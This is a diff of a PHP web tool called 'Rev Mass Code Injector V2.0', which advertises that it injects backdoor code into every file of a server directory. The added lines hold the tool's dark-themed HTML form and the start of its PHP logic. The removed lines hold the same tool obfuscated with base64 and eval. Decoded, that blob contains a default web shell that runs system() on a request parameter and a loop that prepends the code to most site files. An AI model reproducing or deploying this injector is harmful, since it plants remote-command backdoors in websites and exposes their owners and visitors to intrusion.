@@ -1,15 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Rev Mass Code Injector V2.0</title>
+		<meta charset="UTF-8" />
+		<meta http-equiv="refresh" content=""><!-- This Will Refresh Page After Every ___ Seconds -->
+		<meta name="revisit-after" content="3600" />
+		<meta name="language" content="en" />
+		<meta content="index,follow,all" name="googlebot" />
+		<meta name='author' content='https://www.facebook.com/An0n.3xPloiTeR' />
+		<meta content='general' name='rating' />
+		<meta content='pakistan' name='geo.placename' />
+		<meta content='google' name='generator' />
+		<meta content='follow,all' name='msnbot' />
+		<meta content='follow,all' name='alexabot' />
+        <meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
+        <meta name="version" content="2.0" />
+        <meta name="description" content="For injecting the code you gave in every file of the given dir" />
+        <meta name="keywords" content="Injection, index.php, Tool" />
+		<meta name="Tool" content="Made By An0n 3xPloiTeR :)" />
+		<meta name="Working" content="Rev Mass Code Injector V2.0" />
+		<meta name="revised" content="Rev Mass Code Injector V2.0, 25-01-2017" />
+		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
+		<!--
+		<script language="Javascript1.2">
+			function  njs_nodroit() {
+				alert ("Developed By An0n 3xPloiTeR");
+				alert ("Although There Are No Copyrights");
+				alert ("But You Aren't Supposed To Copy My Code (even html xD) :-)");
+				alert ("Got Your Ip: <?php echo $_SERVER['REMOTE_ADDR']; ?> and reported to An0n 3xPloiTeR");
+				return false;
+			} document.oncontextmenu = njs_nodroit;
+		</script>
+		-->
+		<style>
+			body {
+				background-color: black;
+				margin-top: 2vh;
+			}
+			.heading {
+				color: red;
+				font-family: Comic Sans Ms;
+				text-align: center;
+				font-size: 300%;
+			}
+			.subheading {
+				color: white;
+				text-align: center;
+				font-family: Comic Sans Ms;
+				font-size: 100%;
+			}
+			.data {
+				color: white;
+				text-align: center;
+				font-size: 120%;
+				font-family: Comic Sans Ms;
+			}
+			input {
+				color: white;
+				text-align: center;
+				font-weight: bold; 
+				font-family: cursive;
+				border-left: black;
+				border-right: black;
+				border-style: groove;
+				background-color: black; 
+			}
+			select {
+				color: white;
+				text-align: center;
+				font-weight: bold; 
+				font-family: cursive;
+				border-left: black;
+				border-right: black;
+				border-style: groove;
+				background-color: black;
+			}
+			option {
+				color: white;
+				text-align: center;
+				font-weight: bold; 
+				font-family: cursive;
+				border-left: black;
+				border-right: black;
+				border-style: groove;
+				background-color: black; 
+			}
+			textarea {
+				color: white;
+				font-weight: bold; 
+				font-family: cursive;
+				border-left: black;
+				border-right: black;
+				border-style: groove;
+				background-color: black; 
+			}
+			.phpresults {
+				color: white;
+				font-size: 100%;
+				font-family: Comic Sans Ms;
+				text-align: center;
+			}
+			.footer {
+				color: red;
+				font-size: 120%;
+				font-family: Comic Sans Ms;
+				text-align: center;
+				position: fixed;
+				left: 0px;
+				right: 0px;
+				bottom: 3px;
+			}
+			a {
+				color: red;
+				text-decoration: none;
+			}
+			a:hover {
+				color: teal;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="heading">
+			<font>ReV Mass Code Injector V2.0</font>
+		</div>
+		<div class="subheading">
+			<font><br>This Tool Will Inject Backdoor Code or The Code You Will Give :) <br> In Every File Of The Given Directory :D<br><br>You Are Currently In:<?php echo "&nbsp;".getcwd(); ?></font>
+		</div>
+		<div class="data"><br>
+			<form action="" method="POST">
+			<?php
+				$console = '
 <?php
-/*
-The Given Code Was Successfully Obfuscated By An0n 3xPloiTeR's Obfuscator :-)
-Dont change file name from rev.php to make it work properly :-)
-From : http://localhost/obfuscator/obfuscator.php
-Thanks For Using :D
-Dont Forget To Like And Share <3
-Dont Change The Variables Names And If You Change Obfuscated Code Wont Work Properly :-)
-https://www.facebook.com/An0n.3xPloiTeR
-*/
-$UeXploiT = "JTBEJTBBZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuJTI4aHRtbHNwZWNpYWxjaGFyc19kZWNvZGUlMjhiYXNlNjRfZGVjb2RlJTI4YmFzZTY0X2RlY29kZSUyOHVybGRlY29kZSUyOHVybGRlY29kZSUyOCUyNEFuMG5fM3hQbG9pVGVSJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
-$An0n_3xPloiTeR = "UENGRVQwTlVXVkJGSUdoMGJXdytEUW84YUhSdGJDQnNZVzVuUFNKbGJpSStEUW9KUEdobFlXUStEUW9KQ1R4MGFYUnNaVDVTWlhZZ1RXRnpjeUJEYjJSbElFbHVhbVZqZEc5eUlGWXlMakE4TDNScGRHeGxQZzBLQ1FrOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSWdMejROQ2drSlBHMWxkR0VnYUhSMGNDMWxjWFZwZGowaWNtVm1jbVZ6YUNJZ1kyOXVkR1Z1ZEQwaUlqNDhJUzB0SUZSb2FYTWdWMmxzYkNCU1pXWnlaWE5vSUZCaFoyVWdRV1owWlhJZ1JYWmxjbmtnWDE5ZklGTmxZMjl1WkhNZ0xTMCtEUW9KQ1R4dFpYUmhJRzVoYldVOUluSmxkbWx6YVhRdFlXWjBaWElpSUdOdmJuUmxiblE5SWpNMk1EQWlJQzgrRFFvSkNUeHRaWFJoSUc1aGJXVTlJbXhoYm1kMVlXZGxJaUJqYjI1MFpXNTBQU0psYmlJZ0x6NE5DZ2tKUEcxbGRHRWdZMjl1ZEdWdWREMGlhVzVrWlhnc1ptOXNiRzkzTEdGc2JDSWdibUZ0WlQwaVoyOXZaMnhsWW05MElpQXZQZzBLQ1FrOGJXVjBZU0J1WVcxbFBTZGhkWFJvYjNJbklHTnZiblJsYm5ROUoyaDBkSEJ6T2k4dmQzZDNMbVpoWTJWaWIyOXJMbU52YlM5QmJqQnVMak40VUd4dmFWUmxVaWNnTHo0TkNna0pQRzFsZEdFZ1kyOXVkR1Z1ZEQwbloyVnVaWEpoYkNjZ2JtRnRaVDBuY21GMGFXNW5KeUF2UGcwS0NRazhiV1YwWVNCamIyNTBaVzUwUFNkd1lXdHBjM1JoYmljZ2JtRnRaVDBuWjJWdkxuQnNZV05sYm1GdFpTY2dMejROQ2drSlBHMWxkR0VnWTI5dWRHVnVkRDBuWjI5dloyeGxKeUJ1WVcxbFBTZG5aVzVsY21GMGIzSW5JQzgrRFFvSkNUeHRaWFJoSUdOdmJuUmxiblE5SjJadmJHeHZkeXhoYkd3bklHNWhiV1U5SjIxemJtSnZkQ2NnTHo0TkNna0pQRzFsZEdFZ1kyOXVkR1Z1ZEQwblptOXNiRzkzTEdGc2JDY2dibUZ0WlQwbllXeGxlR0ZpYjNRbklDOCtEUW9nSUNBZ0lDQWdJRHh0WlhSaElHNWhiV1U5SW1GMWRHaHZjaUlnWTI5dWRHVnVkRDBpUVc0d2JpQXplRkJzYjJsVVpWSXNJRlZ0WVhJZ1FYSm1aV1Z1SUZOb1lXZ2lJQzgrRFFvZ0lDQWdJQ0FnSUR4dFpYUmhJRzVoYldVOUluWmxjbk5wYjI0aUlHTnZiblJsYm5ROUlqSXVNQ0lnTHo0TkNpQWdJQ0FnSUNBZ1BHMWxkR0VnYm1GdFpUMGlaR1Z6WTNKcGNIUnBiMjRpSUdOdmJuUmxiblE5SWtadmNpQnBibXBsWTNScGJtY2dkR2hsSUdOdlpHVWdlVzkxSUdkaGRtVWdhVzRnWlhabGNua2dabWxzWlNCdlppQjBhR1VnWjJsMlpXNGdaR2x5SWlBdlBnMEtJQ0FnSUNBZ0lDQThiV1YwWVNCdVlXMWxQU0pyWlhsM2IzSmtjeUlnWTI5dWRHVnVkRDBpU1c1cVpXTjBhVzl1TENCcGJtUmxlQzV3YUhBc0lGUnZiMndpSUM4K0RRb0pDVHh0WlhSaElHNWhiV1U5SWxSdmIyd2lJR052Ym5SbGJuUTlJazFoWkdVZ1Fua2dRVzR3YmlBemVGQnNiMmxVWlZJZ09pa2lJQzgrRFFvSkNUeHRaWFJoSUc1aGJXVTlJbGR2Y210cGJtY2lJR052Ym5SbGJuUTlJbEpsZGlCTllYTnpJRU52WkdVZ1NXNXFaV04wYjNJZ1ZqSXVNQ0lnTHo0TkNna0pQRzFsZEdFZ2JtRnRaVDBpY21WMmFYTmxaQ0lnWTI5dWRHVnVkRDBpVW1WMklFMWhjM01nUTI5a1pTQkpibXBsWTNSdmNpQldNaTR3TENBeU5TMHdNUzB5TURFM0lpQXZQZzBLQ1FrOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKWUxWVkJMVU52YlhCaGRHbGliR1VpSUdOdmJuUmxiblE5SWtsRkxXVmtaMlVpSUM4K0RRb0pDVHh0WlhSaElHNWhiV1U5SW5acFpYZHdiM0owSWlCamIyNTBaVzUwUFNKM2FXUjBhRDFrWlhacFkyVXRkMmxrZEdnc0lHbHVhWFJwWVd3dGMyTmhiR1U5TVNJZ0x6NE5DZ2tKUEcxbGRHRWdibUZ0WlQwbmMyVmhjbU5vSUdWdVoybHVaWE1uSUdOdmJuUmxiblE5SjBGbGFYZHBMRUZzWlhoaExFRnNiRlJvWlZkbFlpeEJiSFJoVm1semRHRXNRVTlNVG1WMFptbHVaQ3hCYm5wM1pYSnpMRU5oYm1Ga1lTeEVhWEpsWTNSSWFYUXNSWFZ5YjFObFpXc3NSWGhqYVhSbExFOTJaWEowZFhKbExFZHZMRWR2YjJkc1pTeEliM1JDYjNRZ1NXNW1iMDFoYXl4TFlXNXZiMlJzWlN4TWVXTnZjeXhOWVdOb2FXNWxVMmwwWlN4T1lYUnBiMjVoYkNCRWFYSmxZM1J2Y25rc1RtOXlkR2hsY200Z1RHbG5hSFFzVTJWaGNtTm9TWFFzVTJsdGNHeGxVMlZoY21Ob0xGZGxZbk5OYjNOMFRHbHVhMlZrTEZkbFlsUnZjQ3hYYUdGMExWVXRVMlZsYXl4QlQwd3NXV0ZvYjI4c1YyVmlRM0poZDJ4bGNpeEpibVp2YzJWbGF5eEZlR05wZEdVc1RXRm5aV3hzWVc0c1RHOXZhMU50WVhKMExHSnBibWNzUTA1RlZDeEhiMjluYkdWaWIzUW5JQzgrRFFvSkNUd2hMUzBOQ2drSlBITmpjbWx3ZENCc1lXNW5kV0ZuWlQwaVNtRjJZWE5qY21sd2RERXVNaUkrRFFvSkNRbG1kVzVqZEdsdmJpQWdibXB6WDI1dlpISnZhWFFvS1NCN0RRb0pDUWtKWVd4bGNuUWdLQ0pFWlhabGJHOXdaV1FnUW5rZ1FXNHdiaUF6ZUZCc2IybFVaVklpS1RzTkNna0pDUWxoYkdWeWRDQW9Ja0ZzZEdodmRXZG9JRlJvWlhKbElFRnlaU0JPYnlCRGIzQjVjbWxuYUhSeklpazdEUW9KQ1FrSllXeGxjblFnS0NKQ2RYUWdXVzkxSUVGeVpXNG5kQ0JUZFhCd2IzTmxaQ0JVYnlCRGIzQjVJRTE1SUVOdlpHVWdPaTBwSWlrN0RRb0pDUWtKWVd4bGNuUWdLQ0pIYjNRZ1dXOTFjaUJKY0RvZ1BEOXdhSEFnWldOb2J5QWtYMU5GVWxaRlVsc25Va1ZOVDFSRlgwRkVSRkluWFRzZ1B6NGdZVzVrSUhKbGNHOXlkR1ZrSUhSdklFRnVNRzRnTTNoUWJHOXBWR1ZTSWlrN0RRb0pDUWtKY21WMGRYSnVJR1poYkhObE93MEtDUWtKZlNCa2IyTjFiV1Z1ZEM1dmJtTnZiblJsZUhSdFpXNTFJRDBnYm1welgyNXZaSEp2YVhRN0RRb0pDVHd2YzJOeWFYQjBQZzBLQ1FrdExUNE5DZ2tKUEhOMGVXeGxQZzBLQ1FrSlltOWtlU0I3RFFvSkNRa0pZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2dZbXhoWTJzN0RRb0pDUWtKYldGeVoybHVMWFJ2Y0RvZ01uWm9PdzBLQ1FrSmZRMEtDUWtKTG1obFlXUnBibWNnZXcwS0NRa0pDV052Ykc5eU9pQnlaV1E3RFFvSkNRa0pabTl1ZEMxbVlXMXBiSGs2SUVOdmJXbGpJRk5oYm5NZ1RYTTdEUW9KQ1FrSmRHVjRkQzFoYkdsbmJqb2dZMlZ1ZEdWeU93MEtDUWtKQ1dadmJuUXRjMmw2WlRvZ016QXdKVHNOQ2drSkNYME5DZ2tKQ1M1emRXSm9aV0ZrYVc1bklIc05DZ2tKQ1FsamIyeHZjam9nZDJocGRHVTdEUW9KQ1FrSmRHVjRkQzFoYkdsbmJqb2dZMlZ1ZEdWeU93MEtDUWtKQ1dadmJuUXRabUZ0YVd4NU9pQkRiMjFwWXlCVFlXNXpJRTF6T3cwS0NRa0pDV1p2Ym5RdGMybDZaVG9nTVRBd0pUc05DZ2tKQ1gwTkNna0pDUzVrWVhSaElIc05DZ2tKQ1FsamIyeHZjam9nZDJocGRHVTdEUW9KQ1FrSmRHVjRkQzFoYkdsbmJqb2dZMlZ1ZEdWeU93MEtDUWtKQ1dadmJuUXRjMmw2WlRvZ01USXdKVHNOQ2drSkNRbG1iMjUwTFdaaGJXbHNlVG9nUTI5dGFXTWdVMkZ1Y3lCTmN6c05DZ2tKQ1gwTkNna0pDV2x1Y0hWMElIc05DZ2tKQ1FsamIyeHZjam9nZDJocGRHVTdEUW9KQ1FrSmRHVjRkQzFoYkdsbmJqb2dZMlZ1ZEdWeU93MEtDUWtKQ1dadmJuUXRkMlZwWjJoME9pQmliMnhrT3lBTkNna0pDUWxtYjI1MExXWmhiV2xzZVRvZ1kzVnljMmwyWlRzTkNna0pDUWxpYjNKa1pYSXRiR1ZtZERvZ1lteGhZMnM3RFFvSkNRa0pZbTl5WkdWeUxYSnBaMmgwT2lCaWJHRmphenNOQ2drSkNRbGliM0prWlhJdGMzUjViR1U2SUdkeWIyOTJaVHNOQ2drSkNRbGlZV05yWjNKdmRXNWtMV052Ykc5eU9pQmliR0ZqYXpzZ0RRb0pDUWw5RFFvSkNRbHpaV3hsWTNRZ2V3MEtDUWtKQ1dOdmJHOXlPaUIzYUdsMFpUc05DZ2tKQ1FsMFpYaDBMV0ZzYVdkdU9pQmpaVzUwWlhJN0RRb0pDUWtKWm05dWRDMTNaV2xuYUhRNklHSnZiR1E3SUEwS0NRa0pDV1p2Ym5RdFptRnRhV3g1T2lCamRYSnphWFpsT3cwS0NRa0pDV0p2Y21SbGNpMXNaV1owT2lCaWJHRmphenNOQ2drSkNRbGliM0prWlhJdGNtbG5hSFE2SUdKc1lXTnJPdzBLQ1FrSkNXSnZjbVJsY2kxemRIbHNaVG9nWjNKdmIzWmxPdzBLQ1FrSkNXSmhZMnRuY205MWJtUXRZMjlzYjNJNklHSnNZV05yT3cwS0NRa0pmUTBLQ1FrSmIzQjBhVzl1SUhzTkNna0pDUWxqYjJ4dmNqb2dkMmhwZEdVN0RRb0pDUWtKZEdWNGRDMWhiR2xuYmpvZ1kyVnVkR1Z5T3cwS0NRa0pDV1p2Ym5RdGQyVnBaMmgwT2lCaWIyeGtPeUFOQ2drSkNRbG1iMjUwTFdaaGJXbHNlVG9nWTNWeWMybDJaVHNOQ2drSkNRbGliM0prWlhJdGJHVm1kRG9nWW14aFkyczdEUW9KQ1FrSlltOXlaR1Z5TFhKcFoyaDBPaUJpYkdGamF6c05DZ2tKQ1FsaWIzSmtaWEl0YzNSNWJHVTZJR2R5YjI5MlpUc05DZ2tKQ1FsaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lCaWJHRmphenNnRFFvSkNRbDlEUW9KQ1FsMFpYaDBZWEpsWVNCN0RRb0pDUWtKWTI5c2IzSTZJSGRvYVhSbE93MEtDUWtKQ1dadmJuUXRkMlZwWjJoME9pQmliMnhrT3lBTkNna0pDUWxtYjI1MExXWmhiV2xzZVRvZ1kzVnljMmwyWlRzTkNna0pDUWxpYjNKa1pYSXRiR1ZtZERvZ1lteGhZMnM3RFFvSkNRa0pZbTl5WkdWeUxYSnBaMmgwT2lCaWJHRmphenNOQ2drSkNRbGliM0prWlhJdGMzUjViR1U2SUdkeWIyOTJaVHNOQ2drSkNRbGlZV05yWjNKdmRXNWtMV052Ykc5eU9pQmliR0ZqYXpzZ0RRb0pDUWw5RFFvSkNRa3VjR2h3Y21WemRXeDBjeUI3RFFvSkNRa0pZMjlzYjNJNklIZG9hWFJsT3cwS0NRa0pDV1p2Ym5RdGMybDZaVG9nTVRBd0pUc05DZ2tKQ1FsbWIyNTBMV1poYldsc2VUb2dRMjl0YVdNZ1UyRnVjeUJOY3pzTkNna0pDUWwwWlhoMExXRnNhV2R1T2lCalpXNTBaWEk3RFFvSkNRbDlEUW9KQ1FrdVptOXZkR1Z5SUhzTkNna0pDUWxqYjJ4dmNqb2djbVZrT3cwS0NRa0pDV1p2Ym5RdGMybDZaVG9nTVRJd0pUc05DZ2tKQ1FsbWIyNTBMV1poYldsc2VUb2dRMjl0YVdNZ1UyRnVjeUJOY3pzTkNna0pDUWwwWlhoMExXRnNhV2R1T2lCalpXNTBaWEk3RFFvSkNRa0pjRzl6YVhScGIyNDZJR1pwZUdWa093MEtDUWtKQ1d4bFpuUTZJREJ3ZURzTkNna0pDUWx5YVdkb2REb2dNSEI0T3cwS0NRa0pDV0p2ZEhSdmJUb2dNM0I0T3cwS0NRa0pmUTBLQ1FrSllTQjdEUW9KQ1FrSlkyOXNiM0k2SUhKbFpEc05DZ2tKQ1FsMFpYaDBMV1JsWTI5eVlYUnBiMjQ2SUc1dmJtVTdEUW9KQ1FsOURRb0pDUWxoT21odmRtVnlJSHNOQ2drSkNRbGpiMnh2Y2pvZ2RHVmhiRHNOQ2drSkNYME5DZ2tKUEM5emRIbHNaVDROQ2drOEwyaGxZV1ErRFFvSlBHSnZaSGsrRFFvSkNUeGthWFlnWTJ4aGMzTTlJbWhsWVdScGJtY2lQZzBLQ1FrSlBHWnZiblErVW1WV0lFMWhjM01nUTI5a1pTQkpibXBsWTNSdmNpQldNaTR3UEM5bWIyNTBQZzBLQ1FrOEwyUnBkajROQ2drSlBHUnBkaUJqYkdGemN6MGljM1ZpYUdWaFpHbHVaeUkrRFFvSkNRazhabTl1ZEQ0OFluSStWR2hwY3lCVWIyOXNJRmRwYkd3Z1NXNXFaV04wSUVKaFkydGtiMjl5SUVOdlpHVWdiM0lnVkdobElFTnZaR1VnV1c5MUlGZHBiR3dnUjJsMlpTQTZLU0E4WW5JK0lFbHVJRVYyWlhKNUlFWnBiR1VnVDJZZ1ZHaGxJRWRwZG1WdUlFUnBjbVZqZEc5eWVTQTZSRHhpY2o0OFluSStXVzkxSUVGeVpTQkRkWEp5Wlc1MGJIa2dTVzQ2UEQ5d2FIQWdaV05vYnlBaUptNWljM0E3SWk1blpYUmpkMlFvS1RzZ1B6NDhMMlp2Ym5RK0RRb0pDVHd2WkdsMlBnMEtDUWs4WkdsMklHTnNZWE56UFNKa1lYUmhJajQ4WW5JK0RRb0pDUWs4Wm05eWJTQmhZM1JwYjI0OUlpSWdiV1YwYUc5a1BTSlFUMU5VSWo0TkNna0pDVHcvY0dod0RRb0pDUWtKSkdOdmJuTnZiR1VnUFNBbkRRbzhQM0JvY0EwS2FXWWdLR2x6YzJWMEtDUmZVa1ZSVlVWVFZGdGpiV1JkS1NrZ2V3MEtjM2x6ZEdWdElDZ2tYMUpGVVZWRlUxUmJZMjFrWFNrN0RRcDlEUW8vUGljN0RRb0pDUWsvUGcwS0NRa0pDVHgwWlhoMFlYSmxZU0IwZVhCbFBTSjBaWGgwSWlCdVlXMWxQU0pqYjJSbElpQnliM2R6UFNJeE15SWdZMjlzY3owaU9EQWlJSEJzWVdObGFHOXNaR1Z5UFNKRmJuUmxjaUJaYjNWeUlFTnZaR1VnVEdsclpTQlVhR2x6SURvZ1BEOXdhSEFnWldOb2J5QWtZMjl1YzI5c1pUc2dQejRpUGp3dmRHVjRkR0Z5WldFK1BHSnlQZzBLQ1FrSkNUeHBibkIxZENCemRIbHNaVDBpWm05dWRDMW1ZVzFwYkhrNklFTnZiV2xqSUZOaGJuTWdUWE03SUdadmJuUXRjMmw2WlRvZ09UQWxPeUlnZEhsd1pUMGljM1ZpYldsMElpQnVZVzFsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0pUZFdKdGFYUWlJQzgrRFFvSkNRazhMMlp2Y20wK0RRb0pDVHd2WkdsMlBnMEtDUWs4WkdsMklHTnNZWE56UFNKd2FIQnlaWE4xYkhSeklqNDhZbkkrRFFvSkNRazhQM0JvY0EwS0NRa0pDV2xtSUNocGMzTmxkQ2drWDFCUFUxUmJKM04xWW0xcGRDZGRLU2tnZXcwS0NRa0pDUWtrWTI5a1pTQTlJQ1JmVUU5VFZGc25ZMjlrWlNkZE93MEtDUWtKQ1Fra1kyOWtaVEVnUFNCaVlYTmxOalJmWlc1amIyUmxLQ1JqYjJSbEtUc05DZ2tKQ1FrSkpIQmhkR2dnUFNCblpYUmpkMlFvS1RzTkNna0pDUWtKSkdodmMzUWdQU0FuYUhSMGNEb3ZMeWN1SkY5VFJWSldSVkpiSjBoVVZGQmZTRTlUVkNkZE93MEtDUWtKQ1Fra2NHRjBhRjl2Wmw5bWFXeGxJRDBnSkY5VFJWSldSVkpiSjFORFVrbFFWRjlPUVUxRkoxMDdEUW9KQ1FrSkNTUjNaV0p6YVhSbFgzUmxjM1JwYm1jZ1BTQWthRzl6ZEM0a2NHRjBhRjl2Wmw5bWFXeGxPdzBLQ1FrSkNRa2tjR0YwYUNBOUlHZGxkR04zWkNncE93MEtDUWtKQ1Fra1pHbHlaV04wYjNKNUlEMGdKSEJoZEdnN0RRb05DZ2tKQ1FrSmFXWWdLR1Z0Y0hSNUtDUmpiMlJsS1NrZ2V3MEtDUWtKQ1FrSlpXTm9ieUFuUEdadmJuUWdjMmw2WlQxY0p6VXdKVnduSUdaaFkyVTlYQ2RqZFhKemFYWmxYQ2NnWTI5c2IzSTlYQ2R5WldSY0p6NVpiM1VnYm1WbFpDQjBieUJwYm5CMWRDQnpiMjFsZEdocGJtY2dJU0VoSURwUVBDOW1iMjUwUGljN0RRb0pDUWtKQ1gwTkNnMEtDUWtKQ1FscFppQW9JV1Z0Y0hSNUtDUmpiMlJsS1NrZ2V3MEtEUW9KQ1FrSkNRa0phV1lnS0NSb1lXNWtiR1VnUFNCdmNHVnVaR2x5S0NSa2FYSmxZM1J2Y25rcEtTQjdEUW9KQ1FrSkNRa0paV05vYnlBblYyVmljMmwwWlRvZ0p5NGtkMlZpYzJsMFpWOTBaWE4wYVc1bkxpYzhZbklnTHo0OFluSWdMejRuT3cwS0NRa0pDUWtKQ1dWamFHOGdKMHh2YjJ0cGJtY2dhVzRnSnk0a1pHbHlaV04wYjNKNUxpYzhZbkkrSnpzTkNna0pDUWtKQ1FsM2FHbHNaU0FvSkdacGJHVnpJRDBnY21WaFpHUnBjaWdrYUdGdVpHeGxLU2tnZXcwS0NRa0pDUWtKQ1FscFppQW9KR1pwYkdWeklDRTlJQ2N1SnlBbUppQWtabWxzWlhNZ0lUMGdKeTR1SnlBbUppQWtabWxzWlhNZ0lUMGdKM0psZGk1d2FIQW5JQ1ltSUNSbWFXeGxjeUFoUFNBblVrVldMbkJvY0NjZ0ppWWdKR1pwYkdWeklDRTlJQ2N1YUhSaFkyTmxjM01uSUNZbUlDUm1hV3hsY3lBaFBTQW5jR2h3TG1sdWFTY2dKaVlnSkdacGJHVnpJQ0U5SUNkaFpHMXBiaWNnSmlZZ0pHWnBiR1Z6SUNFOUlDZHBiV0ZuWlhNbklDWW1JQ1JtYVd4bGN5QWhQU0FuYVcxaFoyVW5JQ1ltSUNSbWFXeGxjeUFoUFNBbmFXMW5KeUFtSmlBa1ptbHNaWE1nSVQwZ0ozQm9jRzE1WVdSdGFXNG5JQ1ltSUNSbWFXeGxjeUFoUFNBblptbHNaWE1uSUNZbUlDUm1hV3hsY3lBaFBTQW5MbVowY0hGMWIzUmhKeUFtSmlCemRISjBiMnh2ZDJWeUtITjFZbk4wY2lna1ptbHNaWE1zSUhOMGNuSndiM01vSkdacGJHVnpMQ0FuTGljcElDc2dNU2twSUNFOUlDZDRiV3duSUNZbUlITjBjblJ2Ykc5M1pYSW9jM1ZpYzNSeUtDUm1hV3hsY3l3Z2MzUnljbkJ2Y3lna1ptbHNaWE1zSUNjdUp5a2dLeUF4S1NrZ0lUMGdKMnB3WnljZ0ppWWdjM1J5ZEc5c2IzZGxjaWh6ZFdKemRISW9KR1pwYkdWekxDQnpkSEp5Y0c5ektDUm1hV3hsY3l3Z0p5NG5LU0FySURFcEtTQWhQU0FuYVdOdkp5QW1KaUJ6ZEhKMGIyeHZkMlZ5S0hOMVluTjBjaWdrWm1sc1pYTXNJSE4wY25Kd2IzTW9KR1pwYkdWekxDQW5MaWNwSUNzZ01Ta3BJQ0U5SUNkd2JtY25JQ1ltSUhOMGNuUnZiRzkzWlhJb2MzVmljM1J5S0NSbWFXeGxjeXdnYzNSeWNuQnZjeWdrWm1sc1pYTXNJQ2N1SnlrZ0t5QXhLU2tnSVQwZ0oycHdaV2NuSUNZbUlITjBjblJ2Ykc5M1pYSW9jM1ZpYzNSeUtDUm1hV3hsY3l3Z2MzUnljbkJ2Y3lna1ptbHNaWE1zSUNjdUp5a2dLeUF4S1NrZ0lUMGdKM1I0ZENjZ0ppWWdjM1J5ZEc5c2IzZGxjaWh6ZFdKemRISW9KR1pwYkdWekxDQnpkSEp5Y0c5ektDUm1hV3hsY3l3Z0p5NG5LU0FySURFcEtTQWhQU0FuWlhobEp5QW1KaUJ6ZEhKMGIyeHZkMlZ5S0hOMVluTjBjaWdrWm1sc1pYTXNJSE4wY25Kd2IzTW9KR1pwYkdWekxDQW5MaWNwSUNzZ01Ta3BJQ0U5SUNkb2RHMXNKeUFtSmlCemRISjBiMnh2ZDJWeUtITjFZbk4wY2lna1ptbHNaWE1zSUhOMGNuSndiM01vSkdacGJHVnpMQ0FuTGljcElDc2dNU2twSUNFOUlDZHphSFJ0YkNjZ0ppWWdjM1J5ZEc5c2IzZGxjaWh6ZFdKemRISW9KR1pwYkdWekxDQnpkSEp5Y0c5ektDUm1hV3hsY3l3Z0p5NG5LU0FySURFcEtTQWhQU0FuYUhSdEp5QW1KaUJ6ZEhKMGIyeHZkMlZ5S0hOMVluTjBjaWdrWm1sc1pYTXNJSE4wY25Kd2IzTW9KR1pwYkdWekxDQW5MaWNwSUNzZ01Ta3BJQ0U5SUNkcFkyOG5JQ1ltSUhOMGNuUnZiRzkzWlhJb2MzVmljM1J5S0NSbWFXeGxjeXdnYzNSeWNuQnZjeWdrWm1sc1pYTXNJQ2N1SnlrZ0t5QXhLU2tnSVQwZ0oyTnpjeWNnSmlZZ2MzUnlkRzlzYjNkbGNpaHpkV0p6ZEhJb0pHWnBiR1Z6TENCemRISnljRzl6S0NSbWFXeGxjeXdnSnk0bktTQXJJREVwS1NBaFBTQW5lbWx3SnlBbUppQnpkSEowYjJ4dmQyVnlLSE4xWW5OMGNpZ2tabWxzWlhNc0lITjBjbkp3YjNNb0pHWnBiR1Z6TENBbkxpY3BJQ3NnTVNrcElDRTlJQ2R6Y1d3bklDWW1JSE4wY25SdmJHOTNaWElvYzNWaWMzUnlLQ1JtYVd4bGN5d2djM1J5Y25CdmN5Z2tabWxzWlhNc0lDY3VKeWtnS3lBeEtTa2dJVDBnSjJwekp5QW1KaUJ6ZEhKMGIyeHZkMlZ5S0hOMVluTjBjaWdrWm1sc1pYTXNJSE4wY25Kd2IzTW9KR1pwYkdWekxDQW5MaWNwSUNzZ01Ta3BJQ0U5SUNkd2VTY2dKaVlnYzNSeWRHOXNiM2RsY2loemRXSnpkSElvSkdacGJHVnpMQ0J6ZEhKeWNHOXpLQ1JtYVd4bGN5d2dKeTRuS1NBcklERXBLU0FoUFNBbmNHd25JQ1ltSUhOMGNuUnZiRzkzWlhJb2MzVmljM1J5S0NSbWFXeGxjeXdnYzNSeWNuQnZjeWdrWm1sc1pYTXNJQ2N1SnlrZ0t5QXhLU2tnSVQwZ0oyMWtKeUFtSmlCemRISjBiMnh2ZDJWeUtITjFZbk4wY2lna1ptbHNaWE1zSUhOMGNuSndiM01vSkdacGJHVnpMQ0FuTGljcElDc2dNU2twSUNFOUlDZG5hV1luS1NCN0RRb0pDUWtKQ1FrSkNXVmphRzhnSnp4aElIUmhjbWRsZEQwaVgySnNZVzVySWlCb2NtVm1QU0luTGlSbWFXeGxjeTRuSWo0bkxpUm1hV3hsY3k0blBDOWhQanhtYjI1MElITnBlbVU5SWlJZ1kyOXNiM0k5SW14aGQyNW5jbVZsYmlJZ1ptRmpaVDBpWTNWeWMybDJaU0krSm01aWMzQTdKbTVpYzNBN0ptNWljM0FtYm1KemNEdEpjeUJKYm1wbFkzUmxaRHd2Wm05dWRENDhZbklnTHo0bk93MEtDUWtKQ1FrSkNRa2tabWxzWlY5a1lYUmhJRDBnWW1GelpUWTBYMlJsWTI5a1pTZ2tZMjlrWlRFcE93MEtDUWtKQ1FrSkNRa2tabWxzWlY5a1lYUmhJQzQ5SUdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NSbWFXeGxjeWs3RFFvSkNRa0pDUWtKQ1dacGJHVmZjSFYwWDJOdmJuUmxiblJ6S0NSbWFXeGxjeXdnSkdacGJHVmZaR0YwWVNrN0RRb0pDUWtKQ1FrSkNYMGdEUW9KQ1FrSkNRa0pmUTBLQ1FrSkNRa0pmUTBLQ1FrSkNRbDlEUW9KQ1FrSmZRa05D